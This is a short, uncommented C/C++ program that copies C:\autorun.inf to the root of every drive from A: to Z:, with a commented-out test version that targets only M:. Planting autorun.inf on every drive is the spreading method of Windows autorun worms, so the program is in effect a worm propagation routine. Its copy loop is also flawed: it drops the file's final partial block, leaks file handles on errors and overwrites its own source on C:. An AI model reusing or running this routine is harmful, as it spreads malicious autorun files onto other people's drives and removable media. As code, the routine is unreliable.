#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>

using namespace std;

int main(void) 
{
	size_t len = 0;
	char src[] = "C:\\autorun.inf";
	char destfile[] = "autorun.inf";
	char *destdrives[] = {"A:\\", "B:\\", "C:\\", "D:\\", "E:\\",
								"F:\\", "G:\\", "H:\\", "I:\\", "J:\\",
								"K:\\", "L:\\", "M:\\", "N:\\", "O:\\",
								"P:\\", "Q:\\", "R:\\", "S:\\", "T:\\",
								"U:\\", "V:\\", "W:\\", "X:\\", "Y:\\",
								"Z:\\"
	};
	char buffer[BUFSIZ] = { '\0' };

	// MARK: Placeholder test (only copies file to M:\ drive):
	/*
	char dest[80];
	strcpy(dest, destdrives[12]);
	strcat(dest, destfile);

	FILE *in = fopen(src, "rb");
	FILE *out = fopen(dest, "wb");

	if(in == NULL || out == NULL) 
	{
		perror("An error occured when opening files to read and/or write.");
		in = out = 0;
		return(1);
	}
	else
	{
		while((len = fread(buffer, BUFSIZ, 1, in)) > 0) 
		{
			fwrite(buffer, BUFSIZ, 1, out);
		}
		fclose(in);
		fclose(out);
	}
	*/
	
	// MARK: Code for copying to all drives
	
	char dest[48];
	
	for(int drive = 0; drive < 26; drive++) 
	{
		strcpy(dest, destdrives[drive]);
		strcat(dest, destfile);
		
		FILE *in = fopen(src, "rb");
		FILE *out = fopen(dest, "wb");
		
		if(in == NULL || out == NULL)
		{
			cout << "Error copying to drive: ";
			cout << destdrives[drive];
			in = out = 0;
		}
		else 
		{
			while((len = fread(buffer, BUFSIZ, 1, in)) > 0)
			{
				fwrite(buffer, BUFSIZ, 1, out);
			}
			
			fclose(in);
			fclose(out);
		}
	}
}
